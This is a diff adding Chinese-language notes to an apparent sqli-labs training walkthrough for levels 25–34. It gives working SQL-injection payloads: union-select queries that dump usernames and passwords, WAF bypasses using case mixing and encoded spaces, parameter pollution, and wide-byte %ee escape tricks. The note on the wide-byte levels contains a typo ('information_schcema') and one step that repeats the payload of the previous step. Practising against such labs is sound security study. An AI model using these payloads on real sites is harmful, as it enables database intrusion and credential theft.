@@ -981,6 +981,142 @@ id=1' anandd 1=2 --
 ![image](https://user-images.githubusercontent.com/76896357/115102277-76a1ac00-9f7c-11eb-9f52-579801e6b701.png)
 
 又是一堆正则。。。。。。
+* 查看回显
+```
+?id=0'%0AUNion%0ASeleCt%0A1,2,3%0Aor%0A'1'= '//最好别用hackbar，会出现问题的
+```
+![image](https://user-images.githubusercontent.com/76896357/115107358-0a837000-9f9d-11eb-8870-4b6940bb1dfa.png)
+
+剩下的就类似这样直接查。。。
+
+## 26,27,28..都是过滤union，select可i用大小写绕过，空格用%a0补充
+
+
+## 29. waf保护
+
+* 看看有没有回显
+
+```
+?id=-1' union select 1,2,3 --+
+```
+
+![image](https://user-images.githubusercontent.com/76896357/115104963-ac4f9080-9f8e-11eb-8055-55137a6d224f.png)
+
+
+有回显，查库
+
+```
+?id=-1' union select 1,2,database() --+
+```
+![image](https://user-images.githubusercontent.com/76896357/115105020-dc972f00-9f8e-11eb-9ad8-bbd58b258a10.png)
+
+* 查表
+
+![image](https://user-images.githubusercontent.com/76896357/115105154-aad29800-9f8f-11eb-9e98-382bd4cd164c.png)
+
+* 查列
+
+![image](https://user-images.githubusercontent.com/76896357/115105286-8e832b00-9f90-11eb-9e8c-987c7c99d821.png)
+
+
+* 查字段
+
+![image](https://user-images.githubusercontent.com/76896357/115105279-81fed280-9f90-11eb-8cfa-6f26b93fd36b.png)
+
+想了解waf可以去专门了解一下
+
+## 30. get——blind waf
+
+![image](https://user-images.githubusercontent.com/76896357/115105461-b030e200-9f91-11eb-9ce5-bd577456cc69.png)
+
+果然和上一题一样有点水
+
+* 查表
+
+![image](https://user-images.githubusercontent.com/76896357/115105488-e8d0bb80-9f91-11eb-98ef-7e0380854daf.png)
+
+* 查字段
+
+![image](https://user-images.githubusercontent.com/76896357/115105531-203f6800-9f92-11eb-80df-a544bbad595d.png)
+
+好家伙这里就不行了，看样子并不是很水
+```
+?id=1&id=-1" union select 1,2,group_concat(password) from security.users --+
+```
+
+![image](https://user-images.githubusercontent.com/76896357/115107513-e07e7d80-9f9d-11eb-9453-dc87e892482a.png)
+
+
+## 31. waf
+
+* 看一下闭合方式
+
+![image](https://user-images.githubusercontent.com/76896357/115106645-9c3cae80-9f98-11eb-925f-3f272c7b3f56.png)
+
+* 查看有没有回显
+
+![image](https://user-images.githubusercontent.com/76896357/115106727-ed4ca280-9f98-11eb-8d47-f63124df0489.png)
+
+可以根据回显看处数据库
+
+* 查看数据表
+
+![image](https://user-images.githubusercontent.com/76896357/115106769-2422b880-9f99-11eb-8782-ce56d2305bd6.png)
+
+* 查看字段
+
+![image](https://user-images.githubusercontent.com/76896357/115106810-5cc29200-9f99-11eb-928c-49538fa42fd2.png)
+
+* 查询字段内容
+
+![image](https://user-images.githubusercontent.com/76896357/115106835-7fed4180-9f99-11eb-8fff-f69642be1310.png)
+
+## 32. 宽字节注入
+
+将/进行url转码，再配合另一个比如%ee合在一起转换成gbk字符，把/吃掉
+
+* 查看是否有回显
+
+```
+?id=-1%ee' union select 1,2,3 --+
+```
+![image](https://user-images.githubusercontent.com/76896357/115107087-4fa6a280-9f9b-11eb-8a2c-b78c0b2c3e86.png)
+
+* 查库
+
+```
+?id=-1%ee' union select 1,2,3 --+
+```
+
+![image](https://user-images.githubusercontent.com/76896357/115107537-03a92d00-9f9e-11eb-9e20-9549a227a1f4.png)
+
+剩下的基本上就没什么问题了
+
+* 查列，这时候的users需要改变一下
+
+```
+?id=-1%ee' union select 1,2,column_name from information_schcema.columns where table_name='users' --+//不行
+?id=-1%ee' union select 1,2,column_name from information_schcema.columns where table_name=0x7573657273 --+//对user进行十六进制编码，此时的‘’可以用0x代替
+```
+![image](https://user-images.githubusercontent.com/76896357/115107796-a44c1c80-9f9f-11eb-9a20-f40227e9bca2.png)
+
+剩下就没啥了。。。过
+
+
+## 33.宽字节注入
+
+仍然是刚才查列的句子，直接爆出来了。。
+
+![image](https://user-images.githubusercontent.com/76896357/115107901-1d4b7400-9fa0-11eb-8dde-662f50efa7a5.png)
+
+估计和上一题一样
+
+## 34. POST型宽字节注入
+
+这样的做法，已经比较熟悉了，看见表单抓包构建payload。。
+
+
+
 
 
 
